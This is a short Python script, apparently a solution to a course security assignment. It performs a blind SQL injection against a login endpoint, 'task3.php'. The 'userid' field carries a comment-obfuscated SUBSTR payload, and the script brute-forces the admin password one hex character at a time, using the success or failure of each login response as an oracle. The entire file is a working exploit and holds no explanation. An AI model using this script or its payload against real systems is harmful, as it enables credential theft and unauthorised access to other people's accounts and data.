import requests
import json

ASSIGN2_BASE = "[Your-server-base]"
password=""
pool="0123456789abcdef"
cnt=0



    
for j in range(24):
    for i in pool:
        resp = requests.post("{}/task3.php".format(ASSIGN2_BASE),
                        data = {
                            "userid": "admin'/**/AND/**/SUBSTR(passwd,{0},1)='{1}'#".format(j+1,i),
                            "passwd": "adfafdadf"
                        })
        if(json.loads(resp.text)['status']=='success'):
            password+=i

print("password :", password)